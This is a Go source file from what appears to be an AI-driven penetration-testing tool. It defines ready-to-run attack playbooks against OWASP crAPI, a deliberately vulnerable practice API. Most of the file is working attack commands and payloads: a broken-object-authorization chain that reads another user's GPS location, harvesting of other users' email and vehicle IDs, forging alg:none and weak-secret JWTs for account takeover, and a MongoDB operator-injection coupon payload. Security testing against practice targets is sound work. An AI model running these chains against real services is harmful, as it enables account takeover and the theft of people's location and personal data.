package recon

import (
	"github.com/Armur-Ai/Pentest-Swarm-AI/internal/pipeline"
	"github.com/google/uuid"
)

// crapiProfile is the API surface of OWASP crAPI (completely ridiculous API),
// the multi-container practice target the swarm demos against. crAPI is a
// single-page app whose back-end APIs are invisible to a crawler, so without
// this profile the exploit agent never sees the endpoints where crAPI's
// signature business-logic flaws live.
//
// The routes, request shapes, and attack chain below were verified against a
// live crAPI instance. Notes are written for the exploit planner: they give
// the exact body shapes and the step-by-step chain so it can build a real
// authenticated httpreq attack rather than guessing at the API.
//
// The flagship chain is a broken-object-level-authorization (BOLA) read of
// another user's live GPS location:
//
//	1. POST /identity/api/auth/signup   — register a throwaway attacker
//	2. POST /identity/api/auth/login    — capture the attacker's JWT
//	3. GET  /community/.../posts/recent — excessive data exposure leaks other
//	                                      users' vehicleid (a UUID)
//	4. GET  /identity/.../vehicle/<uuid>/location — BOLA: 200 returns the
//	                                      victim's coordinates
var crapiProfile = apiProfile{
	name: "owasp-crapi",
	// Signature routes: both exist on crAPI (400/401) and 404 elsewhere.
	signatures: []signatureRoute{
		{method: "POST", path: "/identity/api/auth/login"},
		{method: "GET", path: "/community/api/v2/community/posts/recent"},
	},
	build: func(base string) []pipeline.EndpointRecord {
		return []pipeline.EndpointRecord{
			{
				URL:    base + "/identity/api/auth/signup",
				Method: "POST",
				Notes: "Auth: register a throwaway account, then log in. Body (JSON): " +
					`{"name":"atk","email":"atk_{{nonce}}@example.com","number":"{{nonce_num}}","password":"Attacker@123"}. ` +
					"Use {{nonce}} in the email and {{nonce_num}} in the phone number so BOTH are unique across runs " +
					"(crAPI rejects a duplicate email or phone). Returns 200 on success.",
			},
			{
				URL:    base + "/identity/api/auth/login",
				Method: "POST",
				Notes: "Auth: log in with the account created at /signup. Body (JSON): " +
					`{"email":"atk_{{nonce}}@example.com","password":"Attacker@123"}. ` +
					"The response is {\"token\":\"<JWT>\"} — capture it with --capture jwt=$.token and send it on every later " +
					"request as --header 'Authorization: Bearer {{jwt}}'. " +
					"UNVERIFIED LEAD (not confirmed on this target — try it): crAPI's docker-compose sets JWT_SECRET=crapi, " +
					"a hardcoded weak signing secret. If it hasn't been changed, a token can be FORGED for any user without " +
					"credentials: `jwt --action forge --secret crapi --claims '{\"sub\":\"victim@example.com\",\"role\":\"admin\"}' " +
					"--capture jwt=$.token`, then replay it with httpreq exactly as a captured login token above. Confirm by " +
					"checking the forged token is accepted (e.g. GET /identity/api/v2/user/dashboard returns 200) before " +
					"reporting this as a finding.",
			},
			{
				URL:         base + "/community/api/v2/community/posts/recent",
				Method:      "GET",
				Interesting: true,
				Notes: "EXCESSIVE DATA EXPOSURE + BOLA object-id source. Authenticated GET (Authorization: Bearer {{jwt}}). " +
					"The response leaks OTHER users' PII: each post's author has an email and a vehicleid (a UUID). " +
					"Capture a victim's vehicle id with --capture victim_vehicle=$.posts.0.author.vehicleid, then feed it to " +
					"the vehicle-location endpoint below to prove BOLA.",
			},
			{
				URL:         base + "/identity/api/v2/vehicle/{{victim_vehicle}}/location",
				Method:      "GET",
				Interesting: true,
				Parameters:  []string{"vehicleId"},
				Notes: "FLAGSHIP BOLA (broken object-level authorization). Authenticated GET " +
					"(Authorization: Bearer {{jwt}}) for a vehicle id that belongs to ANOTHER user — use the " +
					"{{victim_vehicle}} captured from /community/.../posts/recent. A 200 response returns that user's " +
					"live latitude/longitude, full name and email: reading another user's physical location with your own " +
					"token is the vulnerability. Set expected_output_pattern to \"HTTP 200\" so the step is marked successful " +
					"only when the cross-user read actually works. FULL CHAIN: signup -> login (capture jwt) -> posts/recent " +
					"(capture victim_vehicle) -> this request.",
			},
			{
				URL:    base + "/identity/api/v2/user/dashboard",
				Method: "GET",
				Notes: "Authenticated GET (Authorization: Bearer {{jwt}}) — the caller's own profile/dashboard. " +
					"Useful for confirming the captured token works before pivoting to cross-user (BOLA) reads.",
			},
			{
				URL:    base + "/workshop/api/shop/products",
				Method: "GET",
				Notes: "Authenticated GET (Authorization: Bearer {{jwt}}) — shop catalogue. A secondary surface for " +
					"broken-function-level-authorization and mass-assignment probing (e.g. ordering with a tampered quantity/total).",
			},
		}
	},
	chains: crapiChains,
}

// crapiChains returns crAPI's verified BOLA attack chain as a ready-to-run
// playbook. Every step was confirmed against a live crAPI instance; the
// exploit agent runs it deterministically (no LLM planning) so the finding
// lands reliably. The chain threads state across steps: {{nonce}} keeps the
// throwaway account unique, {{jwt}} carries the captured session token, and
// {{victim_vehicle}} is another user's vehicle id harvested from the data-
// exposure endpoint — reading their location with it is the BOLA.
func crapiChains(base string) []pipeline.AttackPath {
	return []pipeline.AttackPath{
		crapiBOLAVehicleLocation(base),
		crapiExcessiveDataExposure(base),
		crapiNoSQLiCoupon(base),
		crapiJWTForgery(base),
	}
}

// crapiJWTForgery — broken authentication: crAPI verifies JWTs insecurely and
// accepts an unsigned `alg:none` token (and an HS256 token signed with its
// hardcoded secret "crapi"), so an attacker can forge a token for ANY user and
// is authenticated as them with no credentials. VERIFIED against live crAPI: a
// forged alg:none token with sub=<a seeded user> returns that user's full
// account at /identity/api/v2/user/dashboard (HTTP 200) — account takeover.
// Chain: register (to read the feed) -> harvest a victim email from the
// community feed -> forge an alg:none token as the victim -> read the victim's
// dashboard.
func crapiJWTForgery(base string) pipeline.AttackPath {
	steps := crapiAuthSteps(base)
	steps = append(steps,
		pipeline.AttackStep{
			ID:          uuid.New(),
			Name:        "harvest a victim email from the community feed",
			TechniqueID: "T1213",
			Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
				"--header 'Authorization: Bearer {{jwt}}' --capture victim_email=$.posts.0.author.email",
			ExpectedOutputPattern: "email",
		},
		pipeline.AttackStep{
			ID:          uuid.New(),
			Name:        "forge an unsigned (alg:none) token as the victim",
			TechniqueID: "T1134", // Access Token Manipulation
			Command: "jwt --action none " +
				`--claims '{"sub":"{{victim_email}}","role":"admin","iat":1700000000,"exp":1999999999}' --capture forged=$.token`,
		},
		pipeline.AttackStep{
			ID:          uuid.New(),
			Name:        "account takeover: read the victim's dashboard with the forged token",
			TechniqueID: "T1078",
			Command: "httpreq --url " + base + "/identity/api/v2/user/dashboard " +
				"--header 'Authorization: Bearer {{forged}}'",
			// A 200 with the forged (unsigned) token is the vulnerability — a
			// correct verifier would reject it with 401.
			ExpectedOutputPattern: "HTTP 200",
		},
	)
	return pipeline.AttackPath{
		ID:   uuid.New(),
		Name: "crAPI broken authentication: JWT forgery → account takeover",
		Description: "crAPI accepts insecurely-verified JWTs — an unsigned alg:none token (and an HS256 " +
			"token signed with the hardcoded secret 'crapi'). An attacker forges a token for any user and is " +
			"authenticated as them with no password. Chain: register -> read the community feed to harvest a " +
			"victim's email -> forge an alg:none token as that victim -> read their dashboard (full PII) = account takeover.",
		ExpectedImpact:              "critical",
		EstimatedSuccessProbability: 0.9,
		RequiredPrivileges:          "unauthenticated (forges its own token)",
		Steps:                       steps,
	}
}

// crapiAuthSteps returns the two steps every crAPI playbook opens with:
// register a throwaway attacker account (unique email + phone via the seeded
// {{nonce}}/{{nonce_num}}) and log in, capturing the JWT into {{jwt}} for the
// authenticated steps that follow. Factored out so each playbook composes the
// same verified auth bootstrap instead of repeating it.
func crapiAuthSteps(base string) []pipeline.AttackStep {
	return []pipeline.AttackStep{
		{
			ID:          uuid.New(),
			Name:        "register throwaway attacker account",
			TechniqueID: "T1136",
			Command: "httpreq --method POST --url " + base + "/identity/api/auth/signup " +
				`--body '{"name":"atk","email":"atk_{{nonce}}@example.com","number":"{{nonce_num}}","password":"Attacker@123"}'`,
		},
		{
			ID:          uuid.New(),
			Name:        "log in and capture JWT",
			TechniqueID: "T1078",
			Command: "httpreq --method POST --url " + base + "/identity/api/auth/login " +
				`--body '{"email":"atk_{{nonce}}@example.com","password":"Attacker@123"}' --capture jwt=$.token`,
			ExpectedOutputPattern: "HTTP 200",
		},
	}
}

// crapiBOLAVehicleLocation — the flagship chain: read another user's live GPS
// location using a vehicle id harvested from the community feed.
func crapiBOLAVehicleLocation(base string) pipeline.AttackPath {
	steps := crapiAuthSteps(base)
	steps = append(steps,
		pipeline.AttackStep{
			ID:          uuid.New(),
			Name:        "harvest a victim vehicle id from the community feed (excessive data exposure)",
			TechniqueID: "T1213",
			Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
				"--header 'Authorization: Bearer {{jwt}}' --capture victim_vehicle=$.posts.0.author.vehicleid",
			ExpectedOutputPattern: "vehicleid",
		},
		pipeline.AttackStep{
			ID:          uuid.New(),
			Name:        "BOLA: read the victim's vehicle location with the attacker's token",
			TechniqueID: "T1530",
			Command: "httpreq --url " + base + "/identity/api/v2/vehicle/{{victim_vehicle}}/location " +
				"--header 'Authorization: Bearer {{jwt}}'",
			ExpectedOutputPattern: "HTTP 200",
		},
	)
	return pipeline.AttackPath{
		ID:   uuid.New(),
		Name: "crAPI BOLA: cross-user vehicle-location disclosure",
		Description: "Broken Object Level Authorization on the vehicle-location API. A freshly " +
			"registered attacker reads another user's live GPS coordinates by supplying that user's " +
			"vehicle id — harvested from an excessive-data-exposure leak in the community feed — with " +
			"their own valid token. Chain: register -> login (capture JWT) -> read community feed " +
			"(capture a victim's vehicle id) -> read the victim's vehicle location.",
		ExpectedImpact:              "high",
		EstimatedSuccessProbability: 0.9,
		RequiredPrivileges:          "authenticated (self-registered) user",
		Steps:                       steps,
	}
}

// crapiExcessiveDataExposure — the community feed returns other users' PII
// (email + vehicle id) to any authenticated caller. This is a finding in its
// own right (not just the BOLA harvest source).
func crapiExcessiveDataExposure(base string) pipeline.AttackPath {
	steps := crapiAuthSteps(base)
	steps = append(steps, pipeline.AttackStep{
		ID:          uuid.New(),
		Name:        "read the community feed and observe other users' PII",
		TechniqueID: "T1213",
		Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
			"--header 'Authorization: Bearer {{jwt}}'",
		// A leaked vehicleid in the feed proves other users' PII is exposed.
		ExpectedOutputPattern: "vehicleid",
	})
	return pipeline.AttackPath{
		ID:   uuid.New(),
		Name: "crAPI excessive data exposure: community feed leaks user PII",
		Description: "The community feed (/community/api/v2/community/posts/recent) returns every " +
			"post author's email address and internal vehicle id to any authenticated user. A normal " +
			"account can harvest other users' personal data wholesale — and the vehicle ids feed the " +
			"cross-user BOLA on the vehicle-location API.",
		ExpectedImpact:              "high",
		EstimatedSuccessProbability: 0.95,
		RequiredPrivileges:          "authenticated (self-registered) user",
		Steps:                       steps,
	}
}

// crapiNoSQLiCoupon — the coupon validator passes the coupon_code straight into
// a Mongo query, so a query operator ({"$ne":1}) matches an arbitrary coupon
// where a bogus string does not. Returning a real coupon proves the injection.
func crapiNoSQLiCoupon(base string) pipeline.AttackPath {
	steps := crapiAuthSteps(base)
	steps = append(steps, pipeline.AttackStep{
		ID:          uuid.New(),
		Name:        "inject a Mongo operator into the coupon validator (NoSQLi)",
		TechniqueID: "T1190",
		Command: "httpreq --method POST --url " + base + "/community/api/v2/coupon/validate-coupon " +
			`--header 'Authorization: Bearer {{jwt}}' --body '{"coupon_code":{"$ne":1}}'`,
		// A bogus string returns no coupon (500/{}); the operator returns a real
		// coupon_code, so its presence in the body proves the injection.
		ExpectedOutputPattern: "coupon_code",
	})
	return pipeline.AttackPath{
		ID:   uuid.New(),
		Name: "crAPI NoSQL injection: coupon validation operator injection",
		Description: "The coupon-validation endpoint (/community/api/v2/coupon/validate-coupon) " +
			"interpolates the coupon_code into a MongoDB query without sanitisation. Submitting a " +
			"query operator object ({\"coupon_code\":{\"$ne\":1}}) instead of a string matches an " +
			"arbitrary stored coupon and returns it, where a non-existent string returns nothing — " +
			"proving NoSQL operator injection.",
		ExpectedImpact:              "high",
		EstimatedSuccessProbability: 0.85,
		RequiredPrivileges:          "authenticated (self-registered) user",
		Steps:                       steps,
	}
}
